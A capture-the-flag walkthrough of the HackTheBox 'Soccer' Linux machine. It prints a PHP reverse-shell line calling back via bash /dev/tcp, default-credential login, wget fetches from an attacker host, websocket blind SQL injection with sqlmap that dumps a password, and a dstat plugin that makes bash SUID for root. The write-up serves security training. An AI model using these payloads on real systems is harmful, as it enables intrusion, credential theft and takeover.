---
title: "HackTheBox - Soccer"
published: true
---

| Field            | Details                                                                                                                                                            |
| ---------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **OS**           | Linux                                                                                                                                                              |
| **Difficulty**   | Easy                                                                                                                                                               |
| **Release Date** | 2022-12-17                                                                                                                                                         |
| **Pwned Date**   | 2026-05-26                                                                                                                                                         |
| **Tags**         | `Nginx` `blind sql injection` `doas misconfiguration` `dstat privilege escalation` `ffuf` `php` `sqlmap` `sqlmap websocket proxy` `tiny file manager` `web socket` |

## Summary

Soccer is an easy difficulty Linux machine that features a Tiny File Manager service, which in turn leads to a reverse shell on the target system. Enumerating the target reveals a subdomain which is vulnerable to a blind SQL injection through websockets. Leveraging the SQLi leads to dumped SSH credentials for the player user, who can run dstat using doas (an alternative to sudo). By creating a custom Python plugin for dstat, a shell as root is then spawned through the SUID bit of the doas binary, leading to fully escalated privileges.

## Reconnaissance

Start with a broad tcp scan

```bash
nmap -p- --min-rate 5000 -oN all_tcp_ports.txt <TARGET_IP>
```

```
[snip]
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
9091/tcp open  xmltec-xmlmail
[snip]
```

Run a more in-depth scan of detected tcp ports

```bash
nmap -sC -sV -p 22,80,9091 -oN service_scan.txt <TARGET_IP>
```

```
[snip]
80/tcp   open  http            nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://soccer.htb/
|http-server-header: nginx/1.18.0 (Ubuntu)
9091/tcp open  xmltec-xmlmail?
[snip]
```

Notice the **Did not follow redirect to http://soccer.htb/**: accessing the raw ip directly causes a redirect by nginx proxy to the soccer.htb domain.

Add the following line to the /etc/hosts file

```
<TARGET_IP>   soccer.htb
```

Port 80 is running a simple web page with static content related to soccer.

Perform subdirectory enumeration with ffuf

```bash
ffuf -u http://<TARGET_IP>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt
```

This will turn out an interesting path: 'http://soccer.htb/tiny'. This page hosts the login page for a file manager named 'Tiny File Manager'. It’s a open source web based file manager.

It's possible to login with the admin user by using the default credentials: admin / admin@123

This access can be abused to upload a php reverse shell and get a foothold in the box.

## Foothold

Create a 'reverse.php' file with the following content

```php
<?php system("bash -c 'bash -i >& /dev/tcp/YOUR_IP/YOUR_PORT 0>&1'"); ?>
```

Upload the file in the tiny/uploads folder.

Listen for the incoming shell connection on the attacking machine

```bash
nc -lvnp 9001
```

Trigger the reverse.php file by browsing to http://soccer.htb/tiny/uploads/reverse.php

Keep in mind that this box uses several cleanup mechanisms to make the attacker's life harder: don't wait too much to trigger the php file or it will be removed by the system.

Should get a shell as the 'www-data' user

```
listening on [any] 9001 ...
connect to [10.10.14.131] from (UNKNOWN) [10.129.2.227] 56800
bash: cannot set terminal process group (979): Inappropriate ioctl for device
bash: no job control in this shell
www-data@soccer:~/html/tiny/uploads$
```

## Privilege Escalation

Look for SUID binaries

```bash
find / -perm -u=s -type f 2>/dev/null
```

```
[snip]
/usr/local/bin/doas
[snip]
```

doas is a command-line program used to run tasks with the security privileges of another user, an alternative to sudo. Having the SUID bit set it can be run as the owner, which is root:

```
-rwsr-xr-x 1 root root 42224 Nov 17  2022 /usr/local/bin/doas
```

Depending on which commands are allowed to be run with 'doas' it might be possible to use this to escalate privileges to root.

doas relies on a doas.conf file to decide which commands are allowed.

```bash
cat /usr/local/etc/doas.conf
```

```
permit nopass player as root cmd /usr/bin/dstat
```

The doas command only allows the user **player** to run the /usr/bin/dstat command as root without prompting for a password, nothing else.

dstat can be leveraged for local privilege escalation but not as the www-data user: first lateral movement to the 'player' user is needed.

Check listening ports on the box

```bash
ss -tlnp
```

```
[snip]
LISTEN 0 511 127.0.0.1:3000 0.0.0.0:*
[snip]
```

This reveals an internal service listening on port 3000 bound to localhost. The service does not seem reachable from the outside but it's possible to expose it using a tool named 'chisel'.

Install chisel on attacking machine

```bash
sudo apt install chisel
```

Run chisel on the attacking machine

```bash
chisel server -p 8888 --reverse
```

```
2026/05/25 11:33:40 server: Reverse tunnelling enabled
2026/05/25 11:33:40 server: Fingerprint T3EjO7LeILbW5KITZ0GEAYTj9mAxgXPioas9ulfoDZw=
2026/05/25 11:33:40 server: Listening on [http://0.0.0.0:8888](http://0.0.0.0:8888/)
```

Get a statically linked version of chisel to serve it to the target

```bash
wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_linux_amd64.gz
gunzip chisel_1.9.1_linux_amd64.gz
mv chisel_1.9.1_linux_amd64 chisel_static
```

Run a webserver from the same folder to serve the file

```bash
python -m http.server
```

Fetch it on the target

```bash
cd /tmp
wget http://<ATTACKER_IP>:8000/chisel_static
```

Make it executable

```bash
chmod +x chisel_static
```

Run chisel on target

```bash
/tmp/chisel_static client <ATTACKER_IP>:8888 R:3000:127.0.0.1:3000
```

```
2026/05/25 15:48:55 client: Connecting to ws://10.10.14.131:8888
2026/05/25 15:48:55 client: Connected (Latency 24.972594ms)
```

This creates a tunnel between the two machines and everything that is sent to localhost:3000 on the attacker's machine is relayed to localhost:3000 of the target machine and back. Now it's possible to browse to the service on port 3000 as if it was running locally on the attacker's machine.

The page served on port 3000 is similar to the one served on port 80, but with some additional features. For example it allows to login/signup. Also, it has an additional '/match' page that presents this line

```
Free Ticket When You Sign Up/Login
```

hinting to additional content made available after login/signup.

Create an account with the signup feature and log in.

A new 'Tickets' page will be available. It allows to determine whether the ticket id typed in the textbox is valid or not.

At first it won't work. To understand why open the Network tab of the browser's devtools and reload the 'Tickets' page.

A GET request is being made to **ws://soc-player.soccer.htb:9091**, which is used to determine whether the ticket is valid. The request is failing because the domain used is different from soccer.htb, the request is using a subdomain.

The **soc-player.soccer.htb** subdomain is not yet in the /etc/hosts file so the browser cannot resolve it.

Change the line added earlier to the /etc/hosts file to match the following

```
10.129.3.177   soccer.htb soc-player.soccer.htb
```

Reload the page.

Now the GET request works returning a 101 status code (switching protocols).

Type your ticket id in the textbox and press Enter. It will confirm that the ticket exists.

Keep in mind that this page employs another cleanup strategy: after a while the created user will be deleted so it may be necessary to signup again.

This page is most likely querying a database to determine the ticket existence. Earlier the 'ss' command also returned

```
LISTEN 0 151 127.0.0.1:3306 0.0.0.0:*
```

3306 is the default port for mysql. So this could be the db used to store the ticket info.

The webpage shows a 'exist/not exist' type of message to the user. Pages with this kind of feedback are classic candidates for **blind sql injection**.

Assuming your ticket id is 78524, to check if db is injectable type `78524 AND 1=2-- -`. Replace the number with your actual ticket id and press Enter.

Since your ticket exists a query with your ticket id should always return a 'valid ticket' message. But if that input is not properly sanitized by the application and the '1=2' part is evaluated then the query will return a 'not valid' message because 1=2 is always false. So, to recap:

The query returns a 'not exist' message --> means that the '1=2' part was successfully evaluated --> means that the db is vulnerable to injection

All the info from the db can be extracted with the sqlmap tool, in this case there's a caveat though: the db is reachable only via a websocket connection, not HTTP. Sqlmap can only send queries to HTTP services.

A websocket proxy can be used to get around this issue: https://github.com/BKreisel/sqlmap-websocket-proxy

Sqlmap will send the HTTP requests to the proxy that will handle the websocket communication and relay the results back to sqlmap

Get the proxy

```bash
git clone https://github.com/BKreisel/sqlmap-websocket-proxy.git
cd sqlmap-websocket-proxy
python3 -m pipx install .
```

Run the proxy

```bash
sqlmap-websocket-proxy -u ws://soc-player.soccer.htb:9091 -d '{"id": "%param%"}'
```

```
💉 Sqlmap Websocket Proxy

- Proxy Port : 8080
- URL : ws://soc-player.soccer.htb:9091
- Payload : {"id": "%param%"}
[*] Targeting 1 injectable parameter(s)
[+] sqlmap url flag: -u http://localhost:8080/?param1=1
[*] Server Started (Ctrl+c to stop)
```

Run sqlmap to extract existing databases

```bash
sqlmap -u "http://localhost:8080/?param1=1" --dbs --batch
```

```
available databases [5]:
[] information_schema
[] mysql
[] performance_schema
[] soccer_db
[*] sys
```

It reveals a **soccer_db** database

Run sqlmap to discover all tables of the soccer_db db

```bash
sqlmap -u "http://localhost:8080/?param1=1" -D soccer_db --tables --batch
```

```
Database: soccer_db
[1 table]
+----------+
| accounts |
+----------+
```

The command reveals an **accounts** table

Run sqlmap to dump that table

```bash
sqlmap -u "http://localhost:8080/?param1=1" -D soccer_db -T accounts --dump --batch
```

```
Database: soccer_db
Table: accounts
[1 entry]
+------+-------------------+----------------------+----------+
| id   | email             | password             | username |
+------+-------------------+----------------------+----------+
| 1324 | player@player.htb | PlayerOftheMatch2022 | player   |
+------+-------------------+----------------------+----------+
```

The table contains only one row with credentials for the 'player' user.

These credentials were not used only on the 'soccer' webapp but also for the 'player' os user

Use them to connect via ssh

```bash
ssh player@<TARGET_IP>
```

Enter the password

```
player@soccer:~$
```

Lateral movement to the **player** user was achieved successfully.

Now it's possible to exploit the ability to run dstat with doas to escalate the privileges to root.

dstat is a monitoring tool that allows to create custom python plugins and run them with the **dstat --myplugin** syntax.

The following escalation approach was adapted from https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/sudo-dstat-privilege-escalation

Create a 'dstat_exploit.py' file with the following content

```python
import os

class dstat_plugin(dstat):
    def __init__(self):
        self.name = 'Exploit Plugin'
        self.nick = ('output',)
        self.vars = ('message',)
        self.type = 's'
        self.width = 20
        self.scale = 0

    def extract(self):
        os.system('chmod +s /usr/bin/bash')
        self.val['message'] = 'Exploit executed'
```

This plugin will add the SUID bit to the /usr/bin/bash binary, allowing to run it as root.

Serve the file to the target with the python webserver

Fetch the script on the target

```bash
cd /usr/local/share/dstat/
wget http://<ATTACKER_IP>:8000/dstat_exploit.py
```

Make sure the exploit was picked up by dstat running

```bash
dstat —list
```

The output should contain the following

```
[snip]
/usr/local/share/dstat:
exploit
```

The /usr/local/share/dstat folder is cleaned periodically with yet another cleanup mechanism, so don't wait too much or the script will be deleted.

Finally, run the doas command

```bash
doas -u root /usr/bin/dstat --exploit
```

```
/usr/bin/dstat:2619: DeprecationWarning: the imp module is deprecated in favour of importlib; see the module's documentation for alternative uses
import imp
---Exploit-Plugin---
output

Exploit executed
```

After seeing the first 'Exploit executed' line press CTRL+C to exit, otherwise the script will keep running. Dstat, being a monitoring tool, has the default behaviour of running the plugins' code once every second.

Check if the bash binary has now the SUID bit set

```bash
ls -la /usr/bin/bash
```

```
-rwsr-sr-x 1 root root 1183448 Apr 18  2022 /usr/bin/bash
```

It worked as expected.

Run the following command to spawn a root shell

```bash
player@soccer:/usr/local/share/dstat$ /usr/bin/bash -p
```

The -p argument is required to retain the root privileges given by the SUID bit. Without it would just spawn another shell with the 'player' user.

```bash
bash-5.0# whoami
root
```

Got root access.
